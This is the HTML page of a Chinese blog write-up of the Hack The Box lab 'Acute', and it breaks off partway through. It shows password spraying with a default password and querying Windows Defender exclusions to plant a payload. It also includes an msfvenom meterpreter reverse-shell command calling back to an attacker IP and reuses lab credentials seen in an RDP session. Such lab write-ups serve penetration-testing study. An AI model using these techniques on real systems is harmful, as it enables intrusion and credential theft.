@@ -1,0 +1,1022 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <link rel="icon" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FYHypo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[HTB] Acute [[#0x01 端口扫描|0x01 端口扫描]] [[#0x02 web|0x02 web]] [[#0x03 PSWA|0x03 PSWA]] [[#0x03 PSWA#edavies@Acute-PC01|edavies@Acute-PC01]]   [[#0x04 稳固立足点|0x04 稳固立足点]] [[#0x05 横向移动|0x05 横向移动]] [[#0x05">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FYHypo&#39;s blog">
+<meta property="og:url" content="https://fyhypo.github.io/uncategorized/Acute/index.html">
+<meta property="og:site_name" content="FYHypo&#39;s blog">
+<meta property="og:description" content="[HTB] Acute [[#0x01 端口扫描|0x01 端口扫描]] [[#0x02 web|0x02 web]] [[#0x03 PSWA|0x03 PSWA]] [[#0x03 PSWA#edavies@Acute-PC01|edavies@Acute-PC01]]   [[#0x04 稳固立足点|0x04 稳固立足点]] [[#0x05 横向移动|0x05 横向移动]] [[#0x05">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821165729.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820105606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820105915.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820110027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820110532.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112235.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112647.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112932.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113503.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113617.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113734.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114009.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114259.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820115431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114928.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820115535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120146.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120502.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120941.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820121232.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820160720.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820161815.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820161958.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820162819.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165546.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165608.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180419.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165943.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820173133.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180242.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821165337.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182315.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182500.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820183038.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820183324.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820193345.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820195913.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820205550.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820210222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820211948.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820212422.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820213531.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820213736.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820215414.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821105401.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110102.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110407.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821110726.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821111157.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821112612.png">
+<meta property="article:published_time" content="2024-08-31T02:38:24.102Z">
+<meta property="article:modified_time" content="2024-08-31T03:38:05.899Z">
+<meta property="article:author" content="FYHypo">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821165729.png">
+  
+  
+  
+  <title>FYHypo&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fyhypo.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FYHypo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/none.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-31 10:38" pubdate>
+          2024年8月31日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="HTB-Acute"><a href="#HTB-Acute" class="headerlink" title="[HTB] Acute"></a>[HTB] Acute</h1><ul>
+<li>[[#0x01 端口扫描|0x01 端口扫描]]</li>
+<li>[[#0x02 web|0x02 web]]</li>
+<li>[[#0x03 PSWA|0x03 PSWA]]<ul>
+<li>[[#0x03 PSWA#edavies@Acute-PC01|edavies@Acute-PC01]]</li>
+</ul>
+</li>
+<li>[[#0x04 稳固立足点|0x04 稳固立足点]]</li>
+<li>[[#0x05 横向移动|0x05 横向移动]]<ul>
+<li>[[#0x05 横向移动#imonks@ATSSERVER|imonks@ATSSERVER]]</li>
+<li>[[#0x05 横向移动#jmorgan@Acute-PC01|jmorgan@Acute-PC01]]</li>
+<li>[[#0x05 横向移动#awallace@ATSSERVER|awallace@ATSSERVER]]</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821165729.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820105606.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820105915.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820110027.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.136.40 atsserver.acute.local acute.local&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820110532.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster vhost -u https://10.129.136.40 --domain acute.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112235.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>vhost爆破太慢，暂时放下</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112647.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, <span class="hljs-keyword">Joshua </span>Morgan, Lois Hopkins<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>还可以下到一个新员工检查表</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820112932.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113059.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>两个页面全是404：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113503.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>网站管理员是Lois：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113617.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>默认密码： Password1!</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820113734.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>PSWA上有一个dc_manage会话：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114009.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114100.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114259.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>remote超链接<code>https://atsserver.acute.local/Acute_Staff_Access</code>是PSWA的地址：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820115431.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>到这里一条路径就显现出来了，因为我们现在有员工清单和默认密码，完全可以尝试登录PSWA</p>
+</blockquote>
+<blockquote>
+<p>除此之外还应先用exiftool检查该文档</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820114928.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>创建者是FCastle，修改者是Daniel，然而他们都不在之前的名单中<br>主机名是Acute-PC01</p>
+</blockquote>
+<h2 id="0x03-PSWA"><a href="#0x03-PSWA" class="headerlink" title="0x03 PSWA"></a>0x03 PSWA</h2><h3 id="edavies-Acute-PC01"><a href="#edavies-Acute-PC01" class="headerlink" title="edavies@Acute-PC01"></a>edavies@Acute-PC01</h3><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820115535.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, <span class="hljs-keyword">Joshua </span>Morgan, Lois Hopkins<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120146.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>接着我尝试了上述清单中的名字，无一例外的全部不正确<br>考虑到外国人可能会有一些奇怪的约定俗成的命名方式，我让gpt生成一个简单的用户名字典</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120502.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820120941.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>edavies成功了！</p>
+</blockquote>
+<blockquote>
+<p>这也让我们知道了开发者的命名习惯，名字的前半部分取第一个字母+后半部分（Evan Davies&#x3D;edavies），这样看其实在前面发现的FCastle时就已有预兆</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820121232.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>拿到了初始立足点</p>
+</blockquote>
+<h2 id="0x04-稳固立足点"><a href="#0x04-稳固立足点" class="headerlink" title="0x04 稳固立足点"></a>0x04 稳固立足点</h2><blockquote>
+<p>在我多次尝试建立smb连接时全都被中断，严重怀疑存在AV</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820160720.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>查看是否开启defender（0x0为开启）：</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820161815.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>查看是否开启defender防火墙（0x1为开启）：</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile&quot;</span> /v EnableFirewall<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820161958.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>全开了，那么例行惯例先看排除目录：</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820162819.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>显然<code>C:\Windows\System32 </code>没有权限，但是<code>C:\Utils</code>是突破口可以落地</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=10.10.16.8 -f exe -o fy.exe<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="0x05-横向移动"><a href="#0x05-横向移动" class="headerlink" title="0x05 横向移动"></a>0x05 横向移动</h2><h3 id="imonks-ATSSERVER"><a href="#imonks-ATSSERVER" class="headerlink" title="imonks@ATSSERVER"></a>imonks@ATSSERVER</h3><blockquote>
+<p>传winpeas执行</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165546.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165608.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\edavies\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180419.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820165943.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\<span class="hljs-number">2.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>\passwords.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180523.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>获得了一个很长的密码字典，先保存到本地</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820173133.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>看着像在AD里面</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820180242.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>令人意外的是有一个正在进行中的rdp会话，这显然不是我们，有必要进行rdp监控screenshare</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240821165337.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>得到的信息：edavies正在使用<code>acute\imonks</code>@<code>w3_4R3_th3_f0rce.</code>凭据向<code>ATSSERVER</code>进行身份验证，使用的配置还是<code>dc_manage</code></p>
+</blockquote>
+<blockquote>
+<p>按照他的语句尝试连接：</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;W3_4R3_th3_f0rce.&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\imonks&quot;</span>, <span class="hljs-variable">$pass</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182153.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>看起来好像是<code>Measure-Object</code>的cmdlet没被加载</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182315.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240820182500.png" srcset="/img/loading.gif" lazyload></p>
